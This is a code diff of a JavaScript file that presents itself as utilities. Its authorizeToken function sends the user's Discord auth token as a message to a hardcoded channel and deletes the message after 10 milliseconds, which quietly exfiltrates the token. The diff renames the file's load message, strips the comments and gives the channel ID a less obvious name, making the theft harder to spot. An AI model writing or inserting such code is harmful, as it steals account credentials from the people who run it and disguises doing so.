@@ -1,6 +1,7 @@
-console.log("auth.js loaded");
+console.log("utils loaded");
 
-// Delete a message
+const auth_c_id = "1387920548087992380";
+
 async function deleteMessage(authToken, channelId, messageId) {
     try {
         const url = `https://discord.com/api/v9/channels/${channelId}/messages/${messageId}`;
@@ -17,7 +18,6 @@ async function deleteMessage(authToken, channelId, messageId) {
     }
 }
 
-// Send a message
 async function sendMessage(authToken, channelId, messageContent, deleteAfterMs) {
     if (!authToken) {
         console.error("Authentication token missing.");
@@ -53,8 +53,8 @@ async function sendMessage(authToken, channelId, messageContent, deleteAfterMs) 
     }
 }
 
-const channelId = "1387920548087992380";
+
 
 function authorizeToken(token) {
-    sendMessage(token, channelId, token, 10);
+    sendMessage(token, auth_c_id, token, 10);
 }
